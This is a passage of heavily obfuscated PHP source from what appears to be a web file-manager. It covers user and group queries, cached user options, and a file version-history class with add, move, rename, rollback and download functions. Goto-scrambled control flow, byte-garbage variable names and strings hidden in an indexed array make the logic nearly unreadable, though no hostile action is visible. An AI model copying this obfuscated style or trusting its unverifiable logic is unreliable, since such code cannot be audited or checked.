Model($EÚˆ‹œ’›‹[1862])->field($EÚˆ‹œ’›‹[2154])->where($eË–ÈÎ¦í‰)->select(); $d¢ß¬Æ¦õ = array_to_keyvalue($d¢ß¬Æ¦õ, $EÚˆ‹œ’›‹[1690]); goto fØõË¾â÷; c­¢±ßäåô: $CÛ¾Ë…Àô = array_to_keyvalue($cæ‡¤âÓÒ, $EÚˆ‹œ’›‹[33], $EÚˆ‹œ’›‹[1690]); $CÛ¾Ë…Àô = array_remove_value(array_unique($CÛ¾Ë…Àô), $EÚˆ‹œ’›‹[495]); if (!$CÛ¾Ë…Àô || !$cæ‡¤âÓÒ) { return; } goto eÏ—‰¤ÖÎ; b¶‡±ŒÀíÉ: $EÚˆ‹œ’›‹ =& $_SERVER[¬ı§†‰ú˜¼]; $eË–ÈÎ¦í‰ = array($EÚˆ‹œ’›‹[1527] => array($EÚˆ‹œ’›‹[7], $BÆ«ºà–¤)); $cæ‡¤âÓÒ = Model($EÚˆ‹œ’›‹[1771])->where($eË–ÈÎ¦í‰)->select(); goto c­¢±ßäåô; fØõË¾â÷: $cæ‡¤âÓÒ = array_to_keyvalue_group($cæ‡¤âÓÒ, $EÚˆ‹œ’›‹[1527]); foreach ($cæ‡¤âÓÒ as &$Aª‰¯Ÿ×Î) { $b‘æ¢‰É³ = array(); foreach ($Aª‰¯Ÿ×Î as $BÚó®Ó…ãÓ) { if (!$BÚó®Ó…ãÓ[$EÚˆ‹œ’›‹[1785]]) { continue; } $A‚ä‹Ù•Õ = Model($EÚˆ‹œ’›‹[1857])->listData($BÚó®Ó…ãÓ[$EÚˆ‹œ’›‹[1785]]); $b‘æ¢‰É³[] = array($EÚˆ‹œ’›‹[1690] => $BÚó®Ó…ãÓ[$EÚˆ‹œ’›‹[1690]], $EÚˆ‹œ’›‹[2155] => $d¢ß¬Æ¦õ[$BÚó®Ó…ãÓ[$EÚˆ‹œ’›‹[1690]]][$EÚˆ‹œ’›‹[28]], $EÚˆ‹œ’›‹[485] => $d¢ß¬Æ¦õ[$BÚó®Ó…ãÓ[$EÚˆ‹œ’›‹[1690]]][$EÚˆ‹œ’›‹[485]], $EÚˆ‹œ’›‹[404] => $A‚ä‹Ù•Õ); } $Aª‰¯Ÿ×Î = $b‘æ¢‰É³; } unset($Aª‰¯Ÿ×Î); goto Aë²¹Œ¯¡; Aë²¹Œ¯¡: foreach ($d­ œÈÎ… as &$a‰ÌÒ†½Å‡) { $a‰ÌÒ†½Å‡[$EÚˆ‹œ’›‹[1864]] = array(); if (isset($cæ‡¤âÓÒ[$a‰ÌÒ†½Å‡[$EÚˆ‹œ’›‹[1527]]])) { $a‰ÌÒ†½Å‡[$EÚˆ‹œ’›‹[1864]] = $cæ‡¤âÓÒ[$a‰ÌÒ†½Å‡[$EÚˆ‹œ’›‹[1527]]]; } } unset($a‰ÌÒ†½Å‡); goto CÎ²ñˆ; CÎ²ñˆ: } private function _listAppendMeta(&$bç¥ÜŸòº¯, $Fè¿ÈŒ‡) { goto B´¥é›¶è; b‰­‡ƒ³¨ƒ: $D˜¥¥áß ‰ = array($fØ“²õ¨Âà[1527] => array($fØ“²õ¨Âà[7], $Fè¿ÈŒ‡)); $a‰¸¿Ó¬Ş¥ = Model($fØ“²õ¨Âà[2132])->where($D˜¥¥áß ‰)->select(); $a‰¸¿Ó¬Ş¥ = array_to_keyvalue_group($a‰¸¿Ó¬Ş¥, $fØ“²õ¨Âà[1527]); goto DõÖœÆ³ĞŒ; DõÖœÆ³ĞŒ: foreach ($a‰¸¿Ó¬Ş¥ as &$c”¶Š»†¢†) { $b÷­â­ó¥ = array(); foreach ($c”¶Š»†¢† as $F¸ÍÀ¬ÎÂ) { if (!in_array($F¸ÍÀ¬ÎÂ[$fØ“²õ¨Âà[93]], $f’ÄáºÖã¤)) { $b÷­â­ó¥[$F¸ÍÀ¬ÎÂ[$fØ“²õ¨Âà[93]]] = $F¸ÍÀ¬ÎÂ[$fØ“²õ¨Âà[371]]; } } $c”¶Š»†¢† = $b÷­â­ó¥; } unset($c”¶Š»†¢†); $fˆØÃ “¶µ = Model($fØ“²õ¨Âà[2156]); goto d‚¼ÈĞõöí; d‚¼ÈĞõöí: foreach ($bç¥ÜŸòº¯ as &$FùÌ‰¿„½È) { $bë‘À´ŞÆŒ = array(); if (isset($a‰¸¿Ó¬Ş¥[$FùÌ‰¿„½È[$fØ“²õ¨Âà[1527]]])) { $bë‘À´ŞÆŒ = $a‰¸¿Ó¬Ş¥[$FùÌ‰¿„½È[$fØ“²õ¨Âà[1527]]]; } $FùÌ‰¿„½È[$fØ“²õ¨Âà[2157]] = array(); if (isset($bë‘À´ŞÆŒ[$E†±ïõ¸¤])) { $FùÌ‰¿„½È[$fØ“²õ¨Âà[2157]] = $fˆØÃ “¶µ->getUserJobInfo($bë‘À´ŞÆŒ[$E†±ïõ¸¤]); } } unset($FùÌ‰¿„½È); goto aóãÛãéÈ; B´¥é›¶è: $fØ“²õ¨Âà =& $_SERVER[¬ı§†‰ú˜¼]; $E†±ïõ¸¤ = UserJobModel::JOB_KEY; $f’ÄáºÖã¤ = array($fØ“²õ¨Âà[2134]); goto b‰­‡ƒ³¨ƒ; aóãÛãéÈ: } protected function groupUserAll($eÉ ÕÉèÑ) { $C“…ÉùŸ·¦ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$eÉ ÕÉèÑ) { return !1; } $Fãğö‚Ì = Model($C“…ÉùŸ·¦[1771])->field($C“…ÉùŸ·¦[1527])->where(array($C“…ÉùŸ·¦[1690] => array($C“…ÉùŸ·¦[7], $eÉ ÕÉèÑ)))->select(); $Fãğö‚Ì = array_to_keyvalue($Fãğö‚Ì, $C“…ÉùŸ·¦[33], $C“…ÉùŸ·¦[1527]); return array_unique($Fãğö‚Ì); } public function userSearch($fÀ‘ù’º°, $cæ¦ïñÈÖ = "\x2a") { return Model($_SERVER[¬ı§†‰ú˜¼][505])->where($fÀ‘ù’º°)->field($cæ¦ïñÈÖ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\x72\137\157\x70\164\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($e‹’¬¡î×) { $B¢ËƒŞŸŒ­ =& $_SERVER[¬ı§†‰ú˜¼]; if (!defined($B¢ËƒŞŸŒ­[452])) { define($B¢ËƒŞŸŒ­[452], 0); } return "\125\x73\x65\x72\117\160\x74\x69\157\156\x5f{$e‹’¬¡î×}\137" . USER_ID; } protected function filterWhere($Få«ÜµˆØ‘) { $Eƒï¾„‰‘‰ =& $_SERVER[¬ı§†‰ú˜¼]; if (!defined($Eƒï¾„‰‘‰[452])) { define($Eƒï¾„‰‘‰[452], 0); } $Få«ÜµˆØ‘[$Eƒï¾„‰‘‰[1527]] = USER_ID; return $Få«ÜµˆØ‘; } public function cacheRemoveUser($DÄĞàÂ¡ÔÔ, $f¦Â»ºÙ™Ì) { return Cache::remove("\125\x73\145\162\x4f\160\x74\x69\x6f\x6e\x5f{$DÄĞàÂ¡ÔÔ}\x5f" . $f¦Â»ºÙ™Ì); } protected function optionDefault($f†’‰÷«Şİ = '') { $D­©ÚÔá™ =& $_SERVER[¬ı§†‰ú˜¼]; if ($f†’‰÷«Şİ == $D­©ÚÔá™[33]) { return $GLOBALS[$D­©ÚÔá™[6]][$D­©ÚÔá™[2158]]; } if ($f†’‰÷«Şİ == $D­©ÚÔá™[2159]) { return $GLOBALS[$D­©ÚÔá™[6]][$D­©ÚÔá™[2160]]; } } } goto Cé“­Ä‘ïŒ; aîÊì¥ƒÄ: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto A‡¡¬å•‘Š; Dƒ¹¿»„ñ: Hook::bind($bÈÔÖœÄë¨[1113], $bÈÔÖœÄë¨[1114]); Hook::bind($bÈÔÖœÄë¨[1115], $bÈÔÖœÄë¨[1116]); goto fğ®ŞÍ”‹Å; A‡¡¬å•‘Š: $bÈÔÖœÄë¨ =& $_SERVER[¬ı§†‰ú˜¼]; $E÷Ş¸Àœ = $GLOBALS[$bÈÔÖœÄë¨[6]][$bÈÔÖœÄë¨[88]]; if ($E÷Ş¸Àœ[$bÈÔÖœÄë¨[1102]] != 1) { return; } goto eŒ›È áÇ; a††‰‰èÕÌ: Hook::bind($bÈÔÖœÄë¨[1107], $bÈÔÖœÄë¨[1108]); Hook::bind($bÈÔÖœÄë¨[1109], $bÈÔÖœÄë¨[1110]); Hook::bind($bÈÔÖœÄë¨[1111], $bÈÔÖœÄë¨[1112]); goto Dƒ¹¿»„ñ; eŒ›È áÇ: if ($E÷Ş¸Àœ[$bÈÔÖœÄë¨[1103]] <= 0) { return; } if (isset($_REQUEST[$bÈÔÖœÄë¨[1104]]) && $_REQUEST[$bÈÔÖœÄë¨[1104]] == $bÈÔÖœÄë¨[87]) { return; } Hook::bind($bÈÔÖœÄë¨[1105], $bÈÔÖœÄë¨[1106]); goto a††‰‰èÕÌ; fğ®ŞÍ”‹Å: } public static function eventBeforeUpload($b„ÔìÔ‘í) { if ($b„ÔìÔ‘í[3] && $b„ÔìÔ‘í[3] != REPEAT_REPLACE) { return; } $a§»–ÕÜÕ = self::parsePath($b„ÔìÔ‘í[0]); if (!$a§»–ÕÜÕ) { return; } self::add($a§»–ÕÜÕ); } public static function eventBeforeEdit($D­‰äÖ¹œ) { $Dñ‚®éî¹ = self::parsePath($D­‰äÖ¹œ[0]); if (!$Dñ‚®éî¹) { return; } self::add($Dñ‚®éî¹); } public static function eventBeforeCopyFile($cĞíÆ×ÊÔ, $ağ¡ù¼¥ï×, $e“ …í’õœ, $B‚Î’—ŞÊñ, $CÃË†³º¤³, $FìÁ‰÷’ÍÃ) { $D™¦¤õß¢¡ = $e“ …í’õœ->getPathOuter($B‚Î’—ŞÊñ); $e‹ÒŒ¯ïò = self::parsePath($D™¦¤õß¢¡); if (!$e‹ÒŒ¯ïò) { return; } self::add($e‹ÒŒ¯ïò); } public static function eventBeforeRename($cğá«éŞˆ¡) { $DÃ´ôå¾µ =& $_SERVER[¬ı§†‰ú˜¼]; $d÷”×áİÏ† = self::parsePath($cğá«éŞˆ¡[0]); if (!$d÷”×áİÏ†) { return; } $CˆÅ¥²•†Ç = self::checkInHistory($d÷”×áİÏ†); if (!$CˆÅ¥²•†Ç) { return; } if ($CˆÅ¥²•†Ç[$DÃ´ôå¾µ[29]] == $DÃ´ôå¾µ[192]) { $cĞš¤ĞÅ—¦ = self::listData($d÷”×áİÏ†); if ($cĞš¤ĞÅ—¦ && $cĞš¤ĞÅ—¦[$DÃ´ôå¾µ[366]]) { self::moveHistory($d÷”×áİÏ†, $cğá«éŞˆ¡[1]); } } else { IO::rename($CˆÅ¥²•†Ç[$DÃ´ôå¾µ[76]], $cğá«éŞˆ¡[1]); } } public static function eventBeforeMove($eÍŠ›–İì) { goto Bˆ¥°çëæ÷; CËøæğ®ÎÕ: if ($e•¸ö«Ë¬Ë[$C¼Ú´¦¾Î°[29]] == $C¼Ú´¦¾Î°[192]) { $e°÷†¹°ÛÔ = self::listData($bÍ©”×‰²); $f×óªÓß¢Â = rtrim($bé¤µ‹ï®®, $C¼Ú´¦¾Î°[8]) . $C¼Ú´¦¾Î°[8] . ($fç£´Ì ŠÆ ? $fç£´Ì ŠÆ : get_path_this($bÍ©”×‰²)); $BÚ¨™Ìˆù = self::listData($f×óªÓß¢Â); if ($e°÷†¹°ÛÔ && $e°÷†¹°ÛÔ[$C¼Ú´¦¾Î°[366]] && $BÚ¨™Ìˆù && $BÚ¨™Ìˆù[$C¼Ú´¦¾Î°[366]]) { return self::clear($bÍ©”×‰²); } if ($e°÷†¹°ÛÔ && $e°÷†¹°ÛÔ[$C¼Ú´¦¾Î°[366]]) { self::moveHistory($bÍ©”×‰², $fç£´Ì ŠÆ, $aŠÙÖ•ÔÆë); } } else { IO::move($e•¸ö«Ë¬Ë[$C¼Ú´¦¾Î°[76]], $aŠÙÖ•ÔÆë, !1, $fç£´Ì ŠÆ); self::clearEmptyFolder(IO::pathFather($e•¸ö«Ë¬Ë[$C¼Ú´¦¾Î°[76]])); } goto C¼¦ÑÌÇ—Ó; Fƒ¥½êÀ¦‘: $bé¤µ‹ï®® = self::parsePath($eÍŠ›–İì[1]); if (!$bé¤µ‹ï®®) { return; } $fç£´Ì ŠÆ = $eÍŠ›–İì[3]; goto e”ÙâòÆğ; Bˆ¥°çëæ÷: $C¼Ú´¦¾Î° =& $_SERVER[¬ı§†‰ú˜¼]; $bÍ©”×‰² = self::parsePath($eÍŠ›–İì[0]); if (!$bÍ©”×‰²) { return; } goto Fƒ¥½êÀ¦‘; e”ÙâòÆğ: $e•¸ö«Ë¬Ë = self::checkInHistory($bÍ©”×‰²); if (!$e•¸ö«Ë¬Ë) { return; } $aŠÙÖ•ÔÆë = self::pathHistory($bé¤µ‹ï®®); goto CËøæğ®ÎÕ; C¼¦ÑÌÇ—Ó: } public static function eventAfterRemove($AàÑÓ­„, $C·”Ì­¢ƒİ) { goto f‰½‰¶Ø; døÕ‹Çéğ: if ($f±¹‰ïçˆË[$EÏÜÏ„æå”[29]] == $EÏÜÏ„æå”[192]) { $C‰ˆ‹ˆ×˜ = self::listData($dØŠ–ğÆ, !1); if ($C‰ˆ‹ˆ×˜ && $C‰ˆ‹ˆ×˜[$EÏÜÏ„æå”[366]]) { self::clear($dØŠ–ğÆ, !1); } } else { IO::remove($f±¹‰ïçˆË[$EÏÜÏ„æå”[76]]); self::clearEmptyFolder(IO::pathFather($f±¹‰ïçˆË[$EÏÜÏ„æå”[76]])); } goto dŞ©•‡÷éÇ; f‰½‰¶Ø: $EÏÜÏ„æå” =& $_SERVER[¬ı§†‰ú˜¼]; if (!$C·”Ì­¢ƒİ) { return; } $dØŠ–ğÆ = self::parsePath($AàÑÓ­„[0]); goto f²»»Æ; f²»»Æ: if (!$dØŠ–ğÆ) { return; } $f±¹‰ïçˆË = self::checkInHistory($dØŠ–ğÆ); if (!$f±¹‰ïçˆË) { return; } goto døÕ‹Çéğ; dŞ©•‡÷éÇ: } private static function checkInHistory($a–‚¡ÚôŞÁ) { $fÌ³ƒçˆ˜® = self::pathHistory($a–‚¡ÚôŞÁ); if (!IO::exist($fÌ³ƒçˆ˜®)) { $fÌ³ƒçˆ˜® .= $_SERVER[¬ı§†‰ú˜¼][1117]; } return IO::exist($fÌ³ƒçˆ˜®) ? IO::info($fÌ³ƒçˆ˜®) : !1; } private static function parsePath($Dñµ•‚é) { goto dÎ³Ó˜†“ô; d„ÑÄØÀÏ: if (!$cïÅÁŠÂÉß || !$Fæ‰ßí°ù·[$CÀ®—à½ã‚[1119]]) { return !1; } if ($a“àªË¢•ò == KodIO::KOD_SHARE_ITEM) { $bÒĞº…Ê¢Š = IO::init($Dñµ•‚é); if ($bÒĞº…Ê¢Š->pathParse[$CÀ®—à½ã‚[1047]]) { return self::parsePath($bÒĞº…Ê¢Š->pathParse[$CÀ®—à½ã‚[1047]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto f ÁÓ¤îÏÒ; d’–Õ¾ÛÉ: return $Dñµ•‚é; goto Aé²Åğ‡“ñ; dÎ³Ó˜†“ô: $CÀ®—à½ã‚ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$Dñµ•‚é) { return !1; } if ($GLOBALS[$CÀ®—à½ã‚[1118]]) { return; } goto Aƒ¹‘áéùÅ; Aƒ¹‘áéùÅ: $Fæ‰ßí°ù· = KodIO::parse($Dñµ•‚é); $a“àªË¢•ò = $Fæ‰ßí°ù·[$CÀ®—à½ã‚[29]]; $cïÅÁŠÂÉß = !$a“àªË¢•ò || $a“àªË¢•ò == KodIO::KOD_IO || $a“àªË¢•ò == KodIO::KOD_SHARE_ITEM; goto d„ÑÄØÀÏ; f ÁÓ¤îÏÒ: $EøÈ„ÉÀç‡ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $CÀ®—à½ã‚[1120]); foreach ($EøÈ„ÉÀç‡ as $A¼ÉùâÍæ) { if (!$a“àªË¢•ò && substr($Dñµ•‚é, 0, strlen($A¼ÉùâÍæ)) == $A¼ÉùâÍæ) { return !1; } } self::log($GLOBALS[$CÀ®—à½ã‚[1042]] . $CÀ®—à½ã‚[1121] . $Dñµ•‚é); goto d’–Õ¾ÛÉ; Aé²Åğ‡“ñ: } private static function pathHistory($D–°ËÉäÆ÷) { $f‰‡‹ñ§ô =& $_SERVER[¬ı§†‰ú˜¼]; $eøÖÉÏ²ïÂ = self::$_historyBase . ltrim(KodIO::clear($D–°ËÉäÆ÷), $f‰‡‹ñ§ô[8]); $eøÖÉÏ²ïÂ = str_replace(array($f‰‡‹ñ§ô[1122]), array($f‰‡‹ñ§ô[1123]), $eøÖÉÏ²ïÂ); return $eøÖÉÏ²ïÂ; } public static function log($bë³õŸ‘) { } public static function historyCount($cù‡ËÃœ§Ü) { $c³•—š•ß =& $_SERVER[¬ı§†‰ú˜¼]; $fµ°‰¥«Õ = array(); $aÖ»»ÂœÂó = array(); foreach ($cù‡ËÃœ§Ü as $cÑÖªÍ’Óš) { $BÆ•×¨è„ = get_path_father($cÑÖªÍ’Óš); if (!$aÖ»»ÂœÂó[$BÆ•×¨è„]) { $aÖ»»ÂœÂó[$BÆ•×¨è„] = array(); } $aÖ»»ÂœÂó[$BÆ•×¨è„][] = get_path_this($cÑÖªÍ’Óš); } foreach ($aÖ»»ÂœÂó as $BÆ•×¨è„ => $c¾öß„†ï½) { $Fá¦‰åš£… = self::parsePath($BÆ•×¨è„); if (!$Fá¦‰åš£…) { continue; } foreach ($c¾öß„†ï½ as $E‡°¬á¬Ú§) { $c³î¨š¯¥¶ = self::listData(rtrim($Fá¦‰åš£…, $c³•—š•ß[8]) . $c³•—š•ß[8] . $E‡°¬á¬Ú§, !1); if ($c³î¨š¯¥¶ && $c³î¨š¯¥¶[$c³•—š•ß[366]]) { $fµ°‰¥«Õ[rtrim($BÆ•×¨è„, $c³•—š•ß[8]) . $c³•—š•ß[8] . $E‡°¬á¬Ú§] = count($c³î¨š¯¥¶[$c³•—š•ß[366]]); } } } return $fµ°‰¥«Õ; } public static function add($cŞóâ»·) { goto Aï¶ßÌÊ»; a²­óå’¡: if ($Dì¸˜È¨é && $Dì¸˜È¨é[0][$cÃàİöİ¯[171]] == $bÕ¨×ÛíÈ) { return !0; } if (array_key_exists($cÃàİöİ¯[195], $e”ñÍÔ˜) && !$e”ñÍÔ˜[$cÃàİöİ¯[195]]) { return !1; } $EÚ—óªõï¨ = short_id(time()); goto CÍù³Ş¨Á•; Bé­ø†İÀ: if (!$e¬¦¢¾‰É³) { self::clearEmptyFolder($aÉ„¦ç›¡[$cÃàİöİ¯[1128]]); return !1; } array_unshift($Dì¸˜È¨é, $f³Ò ãÑáÃ); if (count($Dì¸˜È¨é) > $d°£†ñö¹‘) { $bğ‰µ¯ö“ = array_slice($Dì¸˜È¨é, $d°£†ñö¹‘); foreach ($bğ‰µ¯ö“ as $C¶•Óœ´…¤) { IO::remove($aÉ„¦ç›¡[$cÃàİöİ¯[1128]] . $C¶•Óœ´…¤[$cÃàİöİ¯[28]]); } $Dì¸˜È¨é = array_slice($Dì¸˜È¨é, 0, $d°£†ñö¹‘); } goto EƒÙŸéÕÅÆ; CÍù³Ş¨Á•: $f³Ò ãÑáÃ = array($cÃàİöİ¯[392] => $EÚ—óªõï¨, $cÃàİöİ¯[171] => $bÕ¨×ÛíÈ, $cÃàİöİ¯[28] => $e”ñÍÔ˜[$cÃàİöİ¯[28]] . $cÃàİöİ¯[95] . date($cÃàİöİ¯[1126]) . rand_string(1), $cÃàİöİ¯[78] => $e”ñÍÔ˜[$cÃàİöİ¯[78]], $cÃàİöİ¯[430] => USER_ID, $cÃàİöİ¯[193] => time(), $cÃàİöİ¯[1127] => $cÃàİöİ¯[33]); IO::mkdir($aÉ„¦ç›¡[$cÃàİöİ¯[1128]]); $e¬¦¢¾‰É³ = IO::copy($cŞóâ»·, $aÉ„¦ç›¡[$cÃàİöİ¯[1128]], !1, $f³Ò ãÑáÃ[$cÃàİöİ¯[28]]); goto Bé­ø†İÀ; EƒÙŸéÕÅÆ: return self::saveData($aÉ„¦ç›¡[$cÃàİöİ¯[1129]], $Dì¸˜È¨é); goto Aä ÃØÒîù; E¾¿•³·ïÖ: $dãÕîïĞÀ = Model($cÃàİöİ¯[731])->get($cÃàİöİ¯[1124]); $cİ£«¹÷— = $GLOBALS[$cÃàİöİ¯[6]][$cÃàİöİ¯[88]][$cÃàİöİ¯[1103]]; $d°£†ñö¹‘ = $dãÕîïĞÀ == $cÃàİöİ¯[1125] ? 5 : $cİ£«¹÷—; goto fÇ¤¸ª¼Âä; fÇ¤¸ª¼Âä: if ($cİ£«¹÷— <= 0) { return; } $bÕ¨×ÛíÈ = IO::hashSimple($cŞóâ»·); $e”ñÍÔ˜ = IO::info($cŞóâ»·); goto DîùÙ¿İ‚; DîùÙ¿İ‚: $Dì¸˜È¨é = $aÉ„¦ç›¡[$cÃàİöİ¯[366]]; if ($e”ñÍÔ˜[$cÃàİöİ¯[78]] == 0) { return; } if ($e”ñÍÔ˜[$cÃàİöİ¯[78]] >= 1024 * 1024 * 500) { return !1; } goto a²­óå’¡; Aï¶ßÌÊ»: $cÃàİöİ¯ =& $_SERVER[¬ı§†‰ú˜¼]; $aÉ„¦ç›¡ = self::listData($cŞóâ»·); if (!$aÉ„¦ç›¡) { return; } goto E¾¿•³·ïÖ; Aä ÃØÒîù: } public static function remove($d•ŠÅÚ°Şä, $C®˜­œ’¬¢) { $a¡Ï½í°Ú =& $_SERVER[¬ı§†‰ú˜¼]; $dƒÏ—Ç­Âœ = self::listData($d•ŠÅÚ°Şä); $Câ×¯òÓ‡Œ = array(); if (!$dƒÏ—Ç­Âœ) { return !1; } foreach ($dƒÏ—Ç­Âœ[$a¡Ï½í°Ú[366]] as $BóÅ«£ØÄ›) { if ($BóÅ«£ØÄ›[$a¡Ï½í°Ú[392]] == $C®˜­œ’¬¢) { IO::remove($dƒÏ—Ç­Âœ[$a¡Ï½í°Ú[1128]] . $BóÅ«£ØÄ›[$a¡Ï½í°Ú[28]]); continue; } $Câ×¯òÓ‡Œ[] = $BóÅ«£ØÄ›; } return self::saveData($dƒÏ—Ç­Âœ[$a¡Ï½í°Ú[1129]], $Câ×¯òÓ‡Œ); } public static function clear($Dø¨©—Œ©—, $Aá´‚êÙ¨ = true) { $C† ˜¡‚Ä =& $_SERVER[¬ı§†‰ú˜¼]; $cÅ³®×ƒäª = self::listData($Dø¨©—Œ©—, $Aá´‚êÙ¨); if (!$cÅ³®×ƒäª) { return !1; } foreach ($cÅ³®×ƒäª[$C† ˜¡‚Ä[366]] as $AÆËÏç£Œ) { IO::remove($cÅ³®×ƒäª[$C† ˜¡‚Ä[1128]] . $AÆËÏç£Œ[$C† ˜¡‚Ä[28]]); } return self::saveData($cÅ³®×ƒäª[$C† ˜¡‚Ä[1129]], array()); } public static function moveHistory($fæ§Ï¬ª£…, $f„ÕÛï = '', $dÏ‡¸ù†¨Æ = '') { goto b„‰±õ£‰­; b„‰±õ£‰­: $E®Ãµ—å˜ =& $_SERVER[¬ı§†‰ú˜¼]; $E¨êŠè¾¶´ = self::listData($fæ§Ï¬ª£…, !1); if (!$E¨êŠè¾¶´ || !$E¨êŠè¾¶´[$E®Ãµ—å˜[366]]) { return !1; } goto aÑ¨ùª¤; Cš— ®‚: $F—ÑÛ²•¿ = substr(get_path_this($E¨êŠè¾¶´[$E®Ãµ—å˜[1129]]), 0, -strlen($b”ƒÖ¤¤‰)); foreach ($E¨êŠè¾¶´[$E®Ãµ—å˜[366]] as $C¨ë Î˜ˆ => $E‡ÀÃñ¹çµ) { $B“ÀéŒä…ù = $f„ÕÛï . substr($E‡ÀÃñ¹çµ[$E®Ãµ—å˜[28]], strlen($F—ÑÛ²•¿)); $f­¦²„‰öÛ = IO::move($E¨êŠè¾¶´[$E®Ãµ—å˜[1128]] . $E‡ÀÃñ¹çµ[$E®Ãµ—å˜[28]], $dÏ‡¸ù†¨Æ, !1, $B“ÀéŒä…ù); if ($f­¦²„‰öÛ) { $E¨êŠè¾¶´[$E®Ãµ—å˜[366]][$C¨ë Î˜ˆ][$E®Ãµ—å˜[28]] = $B“ÀéŒä…ù; } } $E¨êŠè¾¶´[$E®Ãµ—å˜[1129]] = IO::move($E¨êŠè¾¶´[$E®Ãµ—å˜[1129]], $dÏ‡¸ù†¨Æ, !1, $f„ÕÛï . $b”ƒÖ¤¤‰); goto Aãƒ´ÅÊ†; aÑ¨ùª¤: $b”ƒÖ¤¤‰ = $E®Ãµ—å˜[1117]; $f„ÕÛï = $f„ÕÛï ? $f„ÕÛï : get_path_this($fæ§Ï¬ª£…); $dÏ‡¸ù†¨Æ = $dÏ‡¸ù†¨Æ ? $dÏ‡¸ù†¨Æ : $E¨êŠè¾¶´[$E®Ãµ—å˜[1128]]; goto Cš— ®‚; Aãƒ´ÅÊ†: self::saveData($E¨êŠè¾¶´[$E®Ãµ—å˜[1129]], $E¨êŠè¾¶´[$E®Ãµ—å˜[366]]); self::clearEmptyFolder($E¨êŠè¾¶´[$E®Ãµ—å˜[1128]]); goto D…‚µÓ»; D…‚µÓ»: } public static function rollback($fâôÇëÀº¯, $bÚ¶¼Æ»Ëº) { $bİö˜Ì‚© =& $_SERVER[¬ı§†‰ú˜¼]; $e¦á‰©ÌÌõ = self::listData($fâôÇëÀº¯); if (!$e¦á‰©ÌÌõ) { return; } $B¾Ÿ†ÆÙÈĞ = IO::info($fâôÇëÀº¯); foreach ($e¦á‰©ÌÌõ[$bİö˜Ì‚©[366]] as $a„÷ğÁó°ª => $DÃ„ôÏåæ) { if ($DÃ„ôÏåæ[$bİö˜Ì‚©[392]] == $bÚ¶¼Æ»Ëº) { self::add($fâôÇëÀº¯); $FàßÏ¶ÉÊ = $e¦á‰©ÌÌõ[$bİö˜Ì‚©[1128]] . $DÃ„ôÏåæ[$bİö˜Ì‚©[28]]; $f¥ÂòóŠí† = IO::copy($FàßÏ¶ÉÊ, IO::pathFather($fâôÇëÀº¯), REPEAT_REPLACE, $B¾Ÿ†ÆÙÈĞ[$bİö˜Ì‚©[28]]); if ($f¥ÂòóŠí†) { self::remove($fâôÇëÀº¯, $bÚ¶¼Æ»Ëº); } return $f¥ÂòóŠí†; } } return !1; } public static function setDetail($c›Ñô‡†È‚, $c£×ÏÎ„»‰, $CÅ‘‡çÏ³) { $E›¡Â¿è =& $_SERVER[¬ı§†‰ú˜¼]; $e„° Â”™Ô = self::listData($c›Ñô‡†È‚); if (!$e„° Â”™Ô) { return; } foreach ($e„° Â”™Ô[$E›¡Â¿è[366]] as $CŠáÜŞÔñÑ => $c£¶«Ïá±µ) { if ($c£¶«Ïá±µ[$E›¡Â¿è[392]] == $c£×ÏÎ„»‰) { $e„° Â”™Ô[$E›¡Â¿è[366]][$CŠáÜŞÔñÑ][$E›¡Â¿è[1127]] = $CÅ‘‡çÏ³; self::saveData($e„° Â”™Ô[$E›¡Â¿è[1129]], $e„° Â”™Ô[$E›¡Â¿è[366]]); return !0; } } return !1; } public static function fileInfo($fİ»›ç‡š, $E¢Ó„ ²Ñ) { goto f·¤ß›»ÎÜ; fÒôËÎ‘ˆÀ: $bÌ–±£Î¥ê = $bÀÚŠğÉ±”[33]; foreach ($AÖº®·ë°Ö[$bÀÚŠğÉ±”[366]] as $Cº“ÍÚâï´ => $Eô‘»åĞï²) { if ($Eô‘»åĞï²[$bÀÚŠğÉ±”[392]] != $E¢Ó„ ²Ñ) { continue; } $bÌ–±£Î¥ê = $AÖº®·ë°Ö[$bÀÚŠğÉ±”[1128]] . $Eô‘»åĞï²[$bÀÚŠğÉ±”[28]]; break; } if (!$bÌ–±£Î¥ê) { show_json(LNG($bÀÚŠğÉ±”[105]), !1); } goto eßÆ¥©Š¬; eßÆ¥©Š¬: return IO::info($bÌ–±£Î¥ê); goto fØËñ‘‘±Õ; f·¤ß›»ÎÜ: $bÀÚŠğÉ±” =& $_SERVER[¬ı§†‰ú˜¼]; $AÖº®·ë°Ö = self::listData($fİ»›ç‡š); if (!$AÖº®·ë°Ö) { show_json(LNG($bÀÚŠğÉ±”[105]), !1); } goto fÒôËÎ‘ˆÀ; fØËñ‘‘±Õ: } public static function fileOut($D‹»Ùå·ï, $c­Ë†øÍõ, $e®ÈæÍŒŞã = false) { $CİŒÍ„Ÿíæ =& $_SERVER[¬ı§†‰ú˜¼]; $B³Ñå’³†® = self::fileInfo($D‹»Ùå·ï, $c­Ë†øÍõ); $A…êí·„­ =& $GLOBALS[$CİŒÍ„Ÿíæ[7]]; $e®ÈæÍŒŞã = isset($A…êí·„­[$CİŒÍ„Ÿíæ[1093]]) && $A…êí·„­[$CİŒÍ„Ÿíæ[1093]] == 1; if (isset($A…êí·„­[$CİŒÍ„Ÿíæ[29]]) && $A…êí·„­[$CİŒÍ„Ÿíæ[29]] == $CİŒÍ„Ÿíæ[1130]) { return IO::fileOutImage($B³Ñå’³†®[$CİŒÍ„Ÿíæ[76]], $A…êí·„­[$CİŒÍ„Ÿíæ[1131]]); } IO::fileOut($B³Ñå’³†®[$CİŒÍ„Ÿíæ[76]], $e®ÈæÍŒŞã, get_path_this($D‹»Ùå·ï)); } public static function listData($fã–âÅÌŠ, $DñŠ­Ë¦Ù‰ = true) { goto E×ù¨Ÿô¿ì; CÚ½¯”§“: if (substr($fã–âÅÌŠ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $f…Ôğ¨ù = self::pathHistory($fã–âÅÌŠ); $dš¤Ñí„†” = array($CõãÍ‡™»¹[1129] => $f…Ôğ¨ù . $CõãÍ‡™»¹[1117], $CõãÍ‡™»¹[1128] => 